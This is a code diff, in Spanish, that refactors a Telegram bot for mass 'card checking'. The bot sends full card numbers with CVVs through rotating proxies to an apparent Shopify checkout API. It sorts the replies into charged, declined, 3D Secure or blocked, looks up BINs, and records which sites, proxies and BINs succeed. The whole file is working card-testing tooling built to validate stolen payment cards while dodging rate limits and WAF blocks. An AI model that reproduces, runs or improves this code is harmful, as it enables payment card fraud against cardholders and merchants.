@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Bot de Telegram para verificar tarjetas - VERSIÓN PROFESIONAL CORREGIDA
-Con timeouts inteligentes, caché de BIN, múltiples APIs y barra de progreso independiente.
+Bot de Telegram para verificar tarjetas - VERSIÓN CON JOBS AISLADOS
+Cada verificación es una "pestaña" independiente con su propia sesión HTTP.
 """
 
 import os
@@ -35,18 +35,18 @@ def handle_shutdown(signum, frame):
 signal.signal(signal.SIGTERM, handle_shutdown)
 signal.signal(signal.SIGINT, handle_shutdown)
 
-# ================== CONFIGURACIÓN CON CLASE SETTINGS ==================
+# ================== CONFIGURACIÓN ==================
 class Settings:
-    """Configuración global del bot (sin global)"""
+    """Configuración global del bot"""
     TOKEN = os.environ.get("BOT_TOKEN")
     if not TOKEN:
         raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")
 
-    # Múltiples endpoints para rotación (reduce saturación)
+    # Múltiples endpoints para rotación
     API_ENDPOINTS = [
         os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
-        os.environ.get("API_URL2", "https://auto-shopify-api-production.up.railway.app/index.php"),  # Mismo por ahora
-        os.environ.get("API_URL3", "https://auto-shopify-api-production.up.railway.app/index.php"),  # Mismo por ahora
+        os.environ.get("API_URL2", "https://auto-shopify-api-production.up.railway.app/index.php"),
+        os.environ.get("API_URL3", "https://auto-shopify-api-production.up.railway.app/index.php"),
     ]
 
     DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
@@ -62,10 +62,9 @@ class Settings:
         "connect": 3,
         "sock_read": 5,
         "total": 8,
-        "response_body": 3,  # Timeout para leer el body
+        "response_body": 3,
     }
 
-    # Configuración de confianza
     CONFIDENCE_CONFIG = {
         "charged_fast_threshold": 1.5,
         "charged_normal_min": 2.0,
@@ -111,6 +110,44 @@ class Confidence(Enum):
     SUSPICIOUS = "SUSPICIOUS"
     CONFIRMED = "CONFIRMED"
 
+# ================== DATACLASSES ==================
+@dataclass
+class Job:
+    """Una unidad de ejecución aislada - como una pestaña"""
+    site: str
+    proxy: str
+    card_data: Dict
+    job_id: int
+    created_at: datetime = field(default_factory=datetime.now)
+
+@dataclass
+class JobResult:
+    """Resultado de un job individual"""
+    job: Job
+    status: CheckStatus
+    confidence: Confidence
+    reason: str
+    response_time: float
+    http_code: Optional[int]
+    response_text: str
+    success: bool
+    bin_info: Dict = field(default_factory=dict)
+    price: str = "N/A"
+    patterns_detected: List[str] = field(default_factory=list)
+
+@dataclass
+class CheckContext:
+    card_bin: str
+    card_last4: str
+    site: str
+    proxy: str
+    response_time: float
+    http_code: Optional[int]
+    response_text: str
+    response_size: int
+    redirect_count: int
+    timestamp: datetime
+
 # ================== CLASIFICADOR DE RESPUESTAS ==================
 class ResponseThinker:
     SUCCESS_PATTERNS = {
@@ -140,7 +177,7 @@ class ResponseThinker:
     }
     
     @classmethod
-    def think(cls, context: 'CheckContext') -> 'CheckResult':
+    def think(cls, context: CheckContext) -> Tuple[CheckStatus, Confidence, str, List[str]]:
         patterns_detected = []
         
         html_size = context.response_size
@@ -157,17 +194,13 @@ class ResponseThinker:
         
         if context.http_code:
             if context.http_code == 429:
-                return cls._create_result(context, CheckStatus.RATE_LIMIT, Confidence.CONFIRMED, 
-                                         "rate limit detected", patterns_detected + ["http_429"])
+                return CheckStatus.RATE_LIMIT, Confidence.CONFIRMED, "rate limit detected", patterns_detected + ["http_429"]
             elif context.http_code == 403:
-                return cls._create_result(context, CheckStatus.BLOCKED, Confidence.CONFIRMED,
-                                         "access forbidden", patterns_detected + ["http_403"])
+                return CheckStatus.BLOCKED, Confidence.CONFIRMED, "access forbidden", patterns_detected + ["http_403"]
             elif 500 <= context.http_code < 600:
-                return cls._create_result(context, CheckStatus.SITE_DOWN, Confidence.HIGH,
-                                         f"server error {context.http_code}", patterns_detected + [f"http_{context.http_code}"])
+                return CheckStatus.SITE_DOWN, Confidence.HIGH, f"server error {context.http_code}", patterns_detected + [f"http_{context.http_code}"]
             elif context.http_code == 408:
-                return cls._create_result(context, CheckStatus.READ_TIMEOUT, Confidence.HIGH,
-                                         "request timeout", patterns_detected + ["http_408"])
+                return CheckStatus.READ_TIMEOUT, Confidence.HIGH, "request timeout", patterns_detected + ["http_408"]
         
         response_lower = context.response_text.lower()
         
@@ -175,30 +208,23 @@ class ResponseThinker:
             if pattern.search(response_lower):
                 patterns_detected.append(f"block:{block_type}")
                 if block_type == "captcha":
-                    return cls._create_result(context, CheckStatus.CAPTCHA, Confidence.HIGH,
-                                             "captcha detected", patterns_detected)
+                    return CheckStatus.CAPTCHA, Confidence.HIGH, "captcha detected", patterns_detected
                 elif block_type == "3ds":
-                    return cls._create_result(context, CheckStatus.THREE_DS, Confidence.HIGH,
-                                             "3D Secure required", patterns_detected)
+                    return CheckStatus.THREE_DS, Confidence.HIGH, "3D Secure required", patterns_detected
                 elif block_type == "rate_limit":
-                    return cls._create_result(context, CheckStatus.RATE_LIMIT, Confidence.CONFIRMED,
-                                             "rate limited", patterns_detected)
+                    return CheckStatus.RATE_LIMIT, Confidence.CONFIRMED, "rate limited", patterns_detected
                 elif block_type == "waf":
-                    return cls._create_result(context, CheckStatus.WAF_BLOCK, Confidence.HIGH,
-                                             "WAF triggered", patterns_detected)
+                    return CheckStatus.WAF_BLOCK, Confidence.HIGH, "WAF triggered", patterns_detected
         
         for decline_type, pattern in cls.DECLINE_PATTERNS.items():
             if pattern.search(response_lower):
                 patterns_detected.append(f"decline:{decline_type}")
                 if decline_type == "insufficient_funds":
-                    return cls._create_result(context, CheckStatus.INSUFFICIENT_FUNDS, Confidence.CONFIRMED,
-                                             "payment rejected", patterns_detected)
+                    return CheckStatus.INSUFFICIENT_FUNDS, Confidence.CONFIRMED, "insufficient funds", patterns_detected
                 elif decline_type == "card_error":
-                    return cls._create_result(context, CheckStatus.CARD_ERROR, Confidence.CONFIRMED,
-                                             "card error", patterns_detected)
+                    return CheckStatus.CARD_ERROR, Confidence.CONFIRMED, "card error", patterns_detected
                 else:
-                    return cls._create_result(context, CheckStatus.DECLINED, Confidence.CONFIRMED,
-                                             "payment rejected", patterns_detected)
+                    return CheckStatus.DECLINED, Confidence.CONFIRMED, "payment declined", patterns_detected
         
         success_matches = []
         for success_type, pattern in cls.SUCCESS_PATTERNS.items():
@@ -208,80 +234,19 @@ class ResponseThinker:
         
         if success_matches:
             if context.response_time < Settings.CONFIDENCE_CONFIG["charged_fast_threshold"]:
-                return cls._create_result(context, CheckStatus.POSSIBLE_APPROVAL, Confidence.SUSPICIOUS,
-                                         "fast response with success patterns", patterns_detected)
+                return CheckStatus.POSSIBLE_APPROVAL, Confidence.SUSPICIOUS, "fast response with success patterns", patterns_detected
             elif Settings.CONFIDENCE_CONFIG["charged_normal_min"] <= context.response_time <= Settings.CONFIDENCE_CONFIG["charged_normal_max"]:
                 if html_size < Settings.CONFIDENCE_CONFIG["html_large_threshold"]:
-                    return cls._create_result(context, CheckStatus.CHARGED, Confidence.HIGH,
-                                             "confirmed checkout flow", patterns_detected)
+                    return CheckStatus.CHARGED, Confidence.HIGH, "confirmed checkout flow", patterns_detected
                 else:
-                    return cls._create_result(context, CheckStatus.POSSIBLE_APPROVAL, Confidence.MEDIUM,
-                                             "success patterns with large response", patterns_detected)
+                    return CheckStatus.POSSIBLE_APPROVAL, Confidence.MEDIUM, "success patterns with large response", patterns_detected
             else:
-                return cls._create_result(context, CheckStatus.POSSIBLE_APPROVAL, Confidence.LOW,
-                                         "slow success response", patterns_detected)
+                return CheckStatus.POSSIBLE_APPROVAL, Confidence.LOW, "slow success response", patterns_detected
         
         if html_size > Settings.CONFIDENCE_CONFIG["html_large_threshold"]:
-            return cls._create_result(context, CheckStatus.AMBIGUOUS, Confidence.LOW,
-                                     "large HTML response, possible WAF page", patterns_detected)
+            return CheckStatus.AMBIGUOUS, Confidence.LOW, "large HTML response, possible WAF page", patterns_detected
         
-        return cls._create_result(context, CheckStatus.UNKNOWN, Confidence.LOW,
-                                 "unrecognized response pattern", patterns_detected)
-    
-    @classmethod
-    def _create_result(cls, context, status, confidence, reason, patterns):
-        from dataclasses import dataclass
-        result = CheckResult(
-            context=context,
-            status=status,
-            confidence=confidence,
-            reason=reason,
-            success=(status == CheckStatus.CHARGED),
-            price=cls._extract_price(context.response_text),
-            patterns_detected=patterns
-        )
-        return result
-    
-    @staticmethod
-    def _extract_price(text: str) -> str:
-        try:
-            patterns = [
-                r'\$?(\d+\.\d{2})',
-                r'Price["\s:]+(\d+\.\d{2})',
-                r'amount["\s:]+(\d+\.\d{2})',
-            ]
-            for pattern in patterns:
-                match = re.search(pattern, text, re.I)
-                if match:
-                    return f"${match.group(1)}"
-        except:
-            pass
-        return "N/A"
-
-# ================== DATACLASSES ==================
-@dataclass
-class CheckContext:
-    card_bin: str
-    card_last4: str
-    site: str
-    proxy: str
-    response_time: float
-    http_code: Optional[int]
-    response_text: str
-    response_size: int
-    redirect_count: int
-    timestamp: datetime
-
-@dataclass
-class CheckResult:
-    context: CheckContext
-    status: CheckStatus
-    confidence: Confidence
-    reason: str
-    success: bool
-    price: str = "N/A"
-    bin_info: Dict = field(default_factory=dict)
-    patterns_detected: List[str] = field(default_factory=list)
+        return CheckStatus.UNKNOWN, Confidence.LOW, "unrecognized response pattern", patterns_detected
 
 # ================== FUNCIONES AUXILIARES ==================
 def create_progress_bar(current: int, total: int, width: int = 20) -> str:
@@ -318,16 +283,29 @@ def format_time(seconds: float) -> str:
         return f"{minutes}m {secs}s"
     return f"{secs}s"
 
+def extract_price(text: str) -> str:
+    try:
+        patterns = [
+            r'\$?(\d+\.\d{2})',
+            r'Price["\s:]+(\d+\.\d{2})',
+            r'amount["\s:]+(\d+\.\d{2})',
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, text, re.I)
+            if match:
+                return f"${match.group(1)}"
+    except:
+        pass
+    return "N/A"
+
 # ================== BIN LOOKUP CON CACHÉ ==================
 async def get_bin_info(bin_code: str) -> Dict:
     """Consulta información de BIN con caché en memoria"""
     global BIN_CACHE
     
-    # Verificar caché
     async with BIN_CACHE_LOCK:
         if bin_code in BIN_CACHE:
             cache_time, data = BIN_CACHE[bin_code]
-            # Caché válido por 24 horas
             if (datetime.now() - cache_time).total_seconds() < 86400:
                 return data
     
@@ -343,7 +321,6 @@ async def get_bin_info(bin_code: str) -> Dict:
                         "type": data.get("type", "Unknown"),
                     }
                     
-                    # Guardar en caché
                     async with BIN_CACHE_LOCK:
                         BIN_CACHE[bin_code] = (datetime.now(), result)
                     
@@ -351,13 +328,9 @@ async def get_bin_info(bin_code: str) -> Dict:
     except Exception as e:
         logger.debug(f"Error consultando BIN {bin_code}: {e}")
     
-    # Resultado por defecto
     default = {"bank": "Unknown", "brand": "UNKNOWN", "country": "UN", "type": "Unknown"}
-    
-    # Guardar en caché también (para no repetir errores)
     async with BIN_CACHE_LOCK:
         BIN_CACHE[bin_code] = (datetime.now(), default)
-    
     return default
 
 # ================== VALIDACIÓN DE TARJETAS ==================
@@ -419,46 +392,36 @@ class CardValidator:
 
 # ================== DETECCIÓN INTELIGENTE ==================
 def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
-    """
-    Detección INTELIGENTE de tipo de línea.
-    PRIORIDAD: 1. Sitios, 2. Proxies, 3. Tarjetas
-    """
     line = line.strip()
     if not line:
         return None, None
 
-    # ===== 1. DETECTAR SITIOS (URLs) =====
     if line.startswith(('http://', 'https://')):
         rest = line.split('://')[1]
         if '.' in rest and not rest.startswith('.') and ' ' not in rest:
             return 'site', line
 
-    # ===== 2. DETECTAR PROXIES =====
     if not line.startswith(('http://', 'https://')):
         parts = line.split(':')
         
-        # Proxy simple: host:port
         if len(parts) == 2:
             host, port = parts
             if port.isdigit() and 1 <= int(port) <= 65535:
                 if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                     return 'proxy', line
         
-        # Proxy con autenticación: host:port:user:pass
         elif len(parts) == 4:
             host, port, user, password = parts
             if port.isdigit() and 1 <= int(port) <= 65535:
                 if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                     return 'proxy', line
         
-        # Proxy formato API: host:port::
         elif len(parts) == 3 and parts[2] == '':
             host, port, _ = parts
             if port.isdigit() and 1 <= int(port) <= 65535:
                 if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                     return 'proxy', line
 
-    # ===== 3. DETECTAR TARJETAS =====
     if '|' in line:
         parts = line.split('|')
         if len(parts) == 4:
@@ -594,18 +557,26 @@ class Database:
             )
             conn.commit()
 
-    async def save_result(self, user_id: int, result: CheckResult):
+    async def save_job_result(self, user_id: int, result: JobResult):
         patterns_json = json.dumps(result.patterns_detected)
         async with self._batch_lock:
             self._batch_queue.append((
-                user_id, result.context.card_bin, result.context.card_last4,
-                result.context.site, result.context.proxy, result.status.value,
-                result.confidence.value, result.reason, result.context.response_time,
-                result.context.http_code, result.price, json.dumps(result.bin_info),
+                user_id, 
+                result.job.card_data['bin'], 
+                result.job.card_data['last4'],
+                result.job.site, 
+                result.job.proxy, 
+                result.status.value,
+                result.confidence.value, 
+                result.reason, 
+                result.response_time,
+                result.http_code, 
+                result.price, 
+                json.dumps(result.bin_info),
                 patterns_json
             ))
 
-    async def update_learning(self, user_id: int, result: CheckResult):
+    async def update_learning(self, user_id: int, result: JobResult):
         weight = 1.0
         if result.confidence in [Confidence.LOW, Confidence.SUSPICIOUS]:
             weight = 0.3
@@ -614,7 +585,7 @@ class Database:
         
         existing = await self.fetch_one(
             "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ? AND bin = ?",
-            (user_id, result.context.site, result.context.proxy, result.context.card_bin)
+            (user_id, result.job.site, result.job.proxy, result.job.card_data['bin'])
         )
         
         if existing:
@@ -623,7 +594,7 @@ class Database:
             declines = existing["declines"] + (weight if "decline" in result.status.value else 0)
             timeouts = existing["timeouts"] + (weight if "timeout" in result.status.value else 0)
             blocks = existing["blocks"] + (weight if result.status in [CheckStatus.BLOCKED, CheckStatus.WAF_BLOCK, CheckStatus.RATE_LIMIT] else 0)
-            total_time = existing["total_time"] + result.context.response_time
+            total_time = existing["total_time"] + result.response_time
             
             await self.execute(
                 """UPDATE learning SET 
@@ -637,12 +608,12 @@ class Database:
                 """INSERT INTO learning 
                    (user_id, site, proxy, bin, attempts, successes, declines, timeouts, blocks, total_time)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
-                (user_id, result.context.site, result.context.proxy, result.context.card_bin, 1,
+                (user_id, result.job.site, result.job.proxy, result.job.card_data['bin'], 1,
                  weight if result.success else 0,
                  weight if "decline" in result.status.value else 0,
                  weight if "timeout" in result.status.value else 0,
                  weight if result.status in [CheckStatus.BLOCKED, CheckStatus.WAF_BLOCK, CheckStatus.RATE_LIMIT] else 0,
-                 result.context.response_time)
+                 result.response_time)
             )
 
     async def execute(self, query: str, params: tuple = ()):
@@ -765,128 +736,92 @@ class ProxyHealthChecker:
         
         return final_results
 
-# ================== CHECKER CORREGIDO ==================
-class UltraFastChecker:
-    def __init__(self):
-        self.connector = None
-        self.session_pool = deque(maxlen=30)
-        self._initialized = False
-        
-    async def initialize(self):
-        if self._initialized:
-            return
-        self.connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
-        await self._create_sessions()
-        self._initialized = True
-        logger.info(f"✅ Checker inicializado [Instancia: {INSTANCE_ID}]")
-
-    async def _create_sessions(self):
-        for _ in range(30):
-            session = aiohttp.ClientSession(
-                connector=self.connector,
-                timeout=aiohttp.ClientTimeout(
-                    total=Settings.TIMEOUT_CONFIG["total"],
-                    connect=Settings.TIMEOUT_CONFIG["connect"],
-                    sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
-                )
-            )
-            self.session_pool.append(session)
-
-    async def get_session(self):
-        if not self._initialized:
-            await self.initialize()
-        if not self.session_pool:
-            return aiohttp.ClientSession(connector=self.connector)
-        return self.session_pool.popleft()
-
-    async def return_session(self, session):
-        if not session.closed:
-            self.session_pool.append(session)
-
-    async def shutdown(self):
-        self._initialized = False
-        while self.session_pool:
-            s = self.session_pool.popleft()
-            try:
-                await s.close()
-            except:
-                pass
-        if self.connector:
-            await self.connector.close()
-
-    async def check_card(self, site: str, proxy: str, card_data: Dict) -> CheckResult:
+# ================== EJECUTOR DE JOBS ==================
+class JobExecutor:
+    """Ejecuta un job aislado con su propia sesión HTTP"""
+    
+    @staticmethod
+    async def execute(job: Job) -> JobResult:
+        """Ejecuta un job en una 'pestaña' completamente nueva"""
+        card_data = job.card_data
         card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
-        params = {"site": site, "cc": card_str, "proxy": proxy}
+        params = {"site": job.site, "cc": card_str, "proxy": job.proxy}
         
-        session = await self.get_session()
+        # Cada job tiene su propia sesión (como una pestaña nueva)
+        timeout = aiohttp.ClientTimeout(
+            total=Settings.TIMEOUT_CONFIG["total"],
+            connect=Settings.TIMEOUT_CONFIG["connect"],
+            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
+        )
+        
         start_time = time.time()
         
-        # Obtener BIN info con caché
+        # Obtener info de BIN (con caché)
         bin_info = await get_bin_info(card_data['bin'])
-        redirect_count = 0
         
         try:
-            # Rotar entre múltiples endpoints
-            api_endpoint = random.choice(Settings.API_ENDPOINTS)
-            
-            async with session.get(api_endpoint, params=params) as resp:
-                elapsed = time.time() - start_time
+            # SESIÓN NUEVA POR JOB (clave para aislamiento)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                # Rotar endpoint
+                api_endpoint = random.choice(Settings.API_ENDPOINTS)
                 
-                # Timeout específico para leer el body (no bloquea)
-                try:
-                    response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
-                except asyncio.TimeoutError:
-                    # Timeout leyendo body
+                async with session.get(api_endpoint, params=params) as resp:
                     elapsed = time.time() - start_time
+                    
+                    # Timeout específico para leer el body
+                    try:
+                        response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
+                    except asyncio.TimeoutError:
+                        return JobResult(
+                            job=job,
+                            status=CheckStatus.READ_TIMEOUT,
+                            confidence=Confidence.CONFIRMED,
+                            reason="body read timeout",
+                            response_time=time.time() - start_time,
+                            http_code=resp.status,
+                            response_text="",
+                            success=False,
+                            bin_info=bin_info,
+                            price="N/A"
+                        )
+                    
+                    response_size = len(response_text)
+                    
                     context = CheckContext(
                         card_bin=card_data['bin'],
                         card_last4=card_data['last4'],
-                        site=site,
-                        proxy=proxy,
+                        site=job.site,
+                        proxy=job.proxy,
                         response_time=elapsed,
                         http_code=resp.status,
-                        response_text="",
-                        response_size=0,
-                        redirect_count=redirect_count,
+                        response_text=response_text,
+                        response_size=response_size,
+                        redirect_count=len(resp.history) if resp.history else 0,
                         timestamp=datetime.now()
                     )
                     
-                    return CheckResult(
-                        context=context,
-                        status=CheckStatus.READ_TIMEOUT,
-                        confidence=Confidence.CONFIRMED,
-                        reason="body read timeout",
-                        success=False,
-                        bin_info=bin_info
+                    status, confidence, reason, patterns = ResponseThinker.think(context)
+                    price = extract_price(response_text)
+                    success = (status == CheckStatus.CHARGED)
+                    
+                    return JobResult(
+                        job=job,
+                        status=status,
+                        confidence=confidence,
+                        reason=reason,
+                        response_time=elapsed,
+                        http_code=resp.status,
+                        response_text=response_text,
+                        success=success,
+                        bin_info=bin_info,
+                        price=price,
+                        patterns_detected=patterns
                     )
-                
-                response_size = len(response_text)
-                
-                if resp.history:
-                    redirect_count = len(resp.history)
-                
-                context = CheckContext(
-                    card_bin=card_data['bin'],
-                    card_last4=card_data['last4'],
-                    site=site,
-                    proxy=proxy,
-                    response_time=elapsed,
-                    http_code=resp.status,
-                    response_text=response_text,
-                    response_size=response_size,
-                    redirect_count=redirect_count,
-                    timestamp=datetime.now()
-                )
-                
-                result = ResponseThinker.think(context)
-                result.bin_info = bin_info
-                return result
-                
+                    
         except asyncio.TimeoutError as e:
             elapsed = time.time() - start_time
-            error_str = str(e).lower()
             
-            # Clasificar timeout por tiempo, no por mensaje
+            # Clasificar timeout por tiempo
             if elapsed < Settings.TIMEOUT_CONFIG["connect"]:
                 status = CheckStatus.CONNECT_TIMEOUT
                 reason = "proxy connection timeout"
@@ -894,60 +829,39 @@ class UltraFastChecker:
                 status = CheckStatus.READ_TIMEOUT
                 reason = "site read timeout"
             
-            context = CheckContext(
-                card_bin=card_data['bin'],
-                card_last4=card_data['last4'],
-                site=site,
-                proxy=proxy,
-                response_time=elapsed,
-                http_code=None,
-                response_text="",
-                response_size=0,
-                redirect_count=0,
-                timestamp=datetime.now()
-            )
-            
-            return CheckResult(
-                context=context,
+            return JobResult(
+                job=job,
                 status=status,
                 confidence=Confidence.CONFIRMED,
                 reason=reason,
+                response_time=elapsed,
+                http_code=None,
+                response_text="",
                 success=False,
-                bin_info=bin_info
+                bin_info=bin_info,
+                price="N/A"
             )
             
         except Exception as e:
             elapsed = time.time() - start_time
-            context = CheckContext(
-                card_bin=card_data['bin'],
-                card_last4=card_data['last4'],
-                site=site,
-                proxy=proxy,
-                response_time=elapsed,
-                http_code=None,
-                response_text=str(e),
-                response_size=0,
-                redirect_count=0,
-                timestamp=datetime.now()
-            )
-            
-            return CheckResult(
-                context=context,
+            return JobResult(
+                job=job,
                 status=CheckStatus.UNKNOWN,
                 confidence=Confidence.LOW,
                 reason=f"request error: {str(e)[:50]}",
+                response_time=elapsed,
+                http_code=None,
+                response_text=str(e),
                 success=False,
-                bin_info=bin_info
+                bin_info=bin_info,
+                price="N/A"
             )
-        finally:
-            await self.return_session(session)
 
 # ================== USER MANAGER ==================
 class UserManager:
     def __init__(self, db: Database):
         self.db = db
         self._rate_lock = asyncio.Lock()
-        self._last_mass_time = defaultdict(lambda: 0)
 
     async def get_user_data(self, user_id: int) -> Dict:
         row = await self.db.fetch_one(
@@ -1064,17 +978,25 @@ class UserManager:
     async def is_admin(self, user_id: int) -> bool:
         return user_id in Settings.ADMIN_IDS
 
-# ================== CARD CHECK SERVICE CON PROGRESS INDEPENDIENTE ==================
+# ================== CARD CHECK SERVICE CON JOBS ==================
 class CardCheckService:
-    def __init__(self, db: Database, user_manager: UserManager, checker: UltraFastChecker):
+    def __init__(self, db: Database, user_manager: UserManager):
         self.db = db
         self.user_manager = user_manager
-        self.checker = checker
 
-    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> CheckResult:
-        result = await self.checker.check_card(site, proxy, card_data)
-        await self.db.save_result(user_id, result)
+    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> JobResult:
+        """Verifica una sola tarjeta como un job aislado"""
+        job = Job(
+            site=site,
+            proxy=proxy,
+            card_data=card_data,
+            job_id=0
+        )
+        
+        result = await JobExecutor.execute(job)
+        await self.db.save_job_result(user_id, result)
         await self.db.update_learning(user_id, result)
+        
         return result
 
     async def check_mass(
@@ -1084,15 +1006,32 @@ class CardCheckService:
         sites: List[str],
         proxies: List[str],
         progress_callback=None
-    ) -> Tuple[List[CheckResult], int, int, int, float]:
+    ) -> Tuple[List[JobResult], int, int, int, float]:
         
         total_cards = len(cards)
-        queue = asyncio.Queue()
-        for card in cards:
-            await queue.put(card)
         
-        # Resultados (usamos lista para mantener orden aproximado)
-        results = []
+        # ===== 1. CREAR JOBS (combinaciones reales) =====
+        jobs = []
+        for i, card in enumerate(cards):
+            # Rotar sites y proxies para distribución uniforme
+            site = sites[i % len(sites)]
+            proxy = proxies[i % len(proxies)]
+            
+            job = Job(
+                site=site,
+                proxy=proxy,
+                card_data=card,
+                job_id=i
+            )
+            jobs.append(job)
+        
+        # ===== 2. COLA DE JOBS =====
+        queue = asyncio.Queue()
+        for job in jobs:
+            await queue.put(job)
+        
+        # Resultados (lista pre-asignada para mantener orden)
+        results = [None] * len(jobs)
         
         # Contadores atómicos
         processed = 0
@@ -1103,30 +1042,25 @@ class CardCheckService:
         
         # Locks
         counter_lock = asyncio.Lock()
-        results_lock = asyncio.Lock()
         
         # Flag de ejecución
         running = True
         
-        # Rotación de proxies
-        proxy_cycle = deque(proxies)
-        proxy_lock = asyncio.Lock()
-        
         # Número óptimo de workers
         num_workers = min(len(proxies), Settings.MAX_WORKERS_PER_USER, total_cards)
         
-        # ===== WORKER INDEPENDIENTE DE UI =====
+        # ===== 3. UPDATER INDEPENDIENTE =====
         async def progress_updater():
-            """Actualiza la barra de progreso independientemente de los workers"""
-            last_update = time.time()
+            nonlocal processed, approved, declined, timeout
             while running or processed < total_cards:
                 await asyncio.sleep(0.5)
                 
                 if progress_callback:
-                    current_processed = processed
-                    current_approved = approved
-                    current_declined = declined
-                    current_timeout = timeout
+                    async with counter_lock:
+                        current_processed = processed
+                        current_approved = approved
+                        current_declined = declined
+                        current_timeout = timeout
                     
                     try:
                         await progress_callback(
@@ -1139,7 +1073,7 @@ class CardCheckService:
                     except Exception as e:
                         logger.error(f"Error en progress_callback: {e}")
         
-        # ===== WORKER DE VERIFICACIÓN =====
+        # ===== 4. WORKER =====
         async def worker(worker_id: int):
             nonlocal processed, approved, declined, timeout
             
@@ -1148,28 +1082,19 @@ class CardCheckService:
                 if cancel_mass.get(user_id, False):
                     break
                 
-                # Obtener siguiente tarjeta (sin timeout)
+                # Obtener siguiente job
                 try:
-                    card_data = await queue.get()
+                    job = await queue.get()
                 except asyncio.QueueEmpty:
                     break
                 
-                # Obtener proxy (rotación)
-                async with proxy_lock:
-                    proxy = proxy_cycle[0]
-                    proxy_cycle.rotate(1)
+                # EJECUTAR JOB EN PESTAÑA NUEVA
+                result = await JobExecutor.execute(job)
                 
-                # Usar el primer sitio (o rotar si quieres)
-                site = sites[0]
+                # Guardar resultado en la posición correcta
+                results[job.job_id] = result
                 
-                # Verificar tarjeta
-                result = await self.checker.check_card(site, proxy, card_data)
-                
-                # Guardar resultado
-                async with results_lock:
-                    results.append(result)
-                
-                # Actualizar contadores con lock
+                # Actualizar contadores
                 async with counter_lock:
                     if result.success:
                         approved += 1
@@ -1181,22 +1106,20 @@ class CardCheckService:
                     processed += 1
                 
                 # Guardar en BD (en batch)
-                await self.db.save_result(user_id, result)
+                await self.db.save_job_result(user_id, result)
                 await self.db.update_learning(user_id, result)
                 
-                # Marcar tarea como completada
                 queue.task_done()
         
-        # Iniciar updater de progreso
+        # ===== 5. INICIAR TODO =====
         updater_task = asyncio.create_task(progress_updater())
         
-        # Crear y lanzar workers
-        tasks = []
+        worker_tasks = []
         for i in range(num_workers):
             task = asyncio.create_task(worker(i))
-            tasks.append(task)
+            worker_tasks.append(task)
         
-        # Esperar a que la cola se vacíe (TODAS las tarjetas procesadas)
+        # Esperar a que todos los jobs se completen
         await queue.join()
         
         # Detener updater
@@ -1204,25 +1127,24 @@ class CardCheckService:
         await updater_task
         
         # Cancelar workers si es necesario
-        for task in tasks:
+        for task in worker_tasks:
             if not task.done():
                 task.cancel()
         
-        # Esperar a que todos los workers terminen
-        await asyncio.gather(*tasks, return_exceptions=True)
+        await asyncio.gather(*worker_tasks, return_exceptions=True)
         
         elapsed = time.time() - start_time
         
         # Actualización final
         if progress_callback:
-            await progress_callback(processed, approved, declined, timeout, total_cards)
+            async with counter_lock:
+                await progress_callback(processed, approved, declined, timeout, total_cards)
         
         return results, approved, declined, timeout, elapsed
 
 # ================== VARIABLES GLOBALES ==================
 db = None
 user_manager = None
-checker = None
 card_service = None
 cancel_mass = {}
 user_state = {}  # user_id -> current_menu
@@ -1761,7 +1683,7 @@ async def settings_workers(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚡ *WORKERS CONFIGURATION*\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
         f"Max workers per user: `{Settings.MAX_WORKERS_PER_USER}`\n\n"
-        "The bot automatically adjusts workers based on:\n"
+        "Workers are automatically optimized based on:\n"
         "• Number of alive proxies\n"
         "• Timeout rate (>20% reduces workers)\n\n"
         "To change the limit, use:\n"
@@ -1971,12 +1893,12 @@ async def mass_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         for i, r in enumerate(results, 1):
             emoji = get_status_emoji(r.status)
-            f.write(f"[{i}] {emoji} Card: {r.context.card_bin}xxxxxx{r.context.card_last4}\n")
+            f.write(f"[{i}] {emoji} Card: {r.job.card_data['bin']}xxxxxx{r.job.card_data['last4']}\n")
             f.write(f"    Status: {r.status.value.upper()} ({r.confidence.value})\n")
             f.write(f"    Reason: {r.reason}\n")
-            f.write(f"    Site: {r.context.site}\n")
-            f.write(f"    Proxy: {r.context.proxy}\n")
-            f.write(f"    Time: {r.context.response_time:.2f}s\n")
+            f.write(f"    Site: {r.job.site}\n")
+            f.write(f"    Proxy: {r.job.proxy}\n")
+            f.write(f"    Time: {r.response_time:.2f}s\n")
             f.write("-"*40 + "\n")
     
     with open(filename, "rb") as f:
@@ -2226,10 +2148,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response = (
                 f"{emoji} *RESULT*\n"
                 f"━━━━━━━━━━━━━━━━━━\n\n"
-                f"💳 Card: `{result.context.card_bin}xxxxxx{result.context.card_last4}`\n"
+                f"💳 Card: `{result.job.card_data['bin']}xxxxxx{result.job.card_data['last4']}`\n"
                 f"📊 Status: {emoji} `{result.status.value.upper()}` {confidence_text}\n"
                 f"📝 Reason: {result.reason}\n"
-                f"⚡ Time: `{result.context.response_time:.2f}s`\n"
+                f"⚡ Time: `{result.response_time:.2f}s`\n"
             )
             
             if result.price != "N/A":
@@ -2248,9 +2170,9 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await show_main_menu(update, context, edit=False)
 
-# ================== MANEJO DE ARCHIVOS CORREGIDO ==================
+# ================== MANEJO DE ARCHIVOS ==================
